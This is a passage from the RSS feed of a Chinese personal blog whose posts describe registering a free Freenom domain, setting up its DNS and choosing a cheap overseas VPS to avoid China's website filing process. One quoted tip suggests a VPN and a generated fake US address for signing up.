&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9xrn.png" alt="BJ9xrn.png">接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9vKs.png" alt="BJ9vKs.png">点击continue按钮会提示注册，这里又有坑。&lt;/p>
&lt;blockquote>
&lt;p>由于蝗虫一般涌入试图薅羊毛的中国人让 &lt;code>freenom&lt;/code> 极度不爽, &lt;code>freenom&lt;/code> 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 &lt;a href="https://www.fakenamegenerator.com/">fakenamegenerator.com&lt;/a> 胡诌个美国住址, 就可以随意注册免费域名了.&lt;/p>&lt;/blockquote>
&lt;h3 id="3域名解析">&lt;strong>3.域名解析&lt;/strong>&lt;/h3>
&lt;p>​	完成以后点击Services&amp;ndash;&amp;gt;My Domains进入域名管理页面。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJCk24.png" alt="BJCk24.png">&lt;/p>
&lt;p>点击域名后面的Manage Domain进入域名解析&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/penginman/PicBed/master/20201029160037.png" alt="">&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJCpV0.png" alt="BJCpV0.png">&lt;/p>
&lt;p>​	Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJC9aV.png" alt="BJC9aV.png">&lt;/p>
&lt;p>之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/10/29/BJCiPU.png" alt="BJCiPU.png">&lt;/p></description></item><item><title>造窝过程(一)</title><link>/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</link><pubDate>Wed, 02 Sep 2020 11:14:35 +0000</pubDate><guid>/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</guid><description>&lt;ul>
&lt;li>备案劝退&lt;/li>
&lt;/ul>
&lt;p>很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&amp;raquo;&amp;gt;阿里云审核通过&amp;raquo;&amp;gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9L8g.jpg" alt="BJ9L8g.jpg">看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。&lt;/p>
&lt;ul>
&lt;li>选择服务器&lt;/li>
&lt;/ul>
&lt;p>听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：&lt;a href="https://www.vultr.com/">vultr&lt;/a>、&lt;a href="https://bwh88.net/">搬瓦工&lt;/a>、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的&lt;a href="https://www.pacificrack.com/">pacificrack&lt;/a>,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！&lt;/p>
&lt;ul>
&lt;li>域名注册&lt;/li>
&lt;/ul>
&lt;p>服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商&lt;a href="http://www.freenom.com">freenom&lt;/a>，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。&lt;/p>
&lt;p>到这服务器和域名都搞定了。&lt;/p></description></item><item><title>第一篇文章</title><link>/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link><pubDate>Wed, 26 Aug 2020 16:40:03 +0000</pubDate><guid>/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid><description>&lt;p>&lt;strong>第一篇文章的内容&lt;/strong>&lt;/p>
&lt;p>刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。&lt;/p></description></item></channel></rss>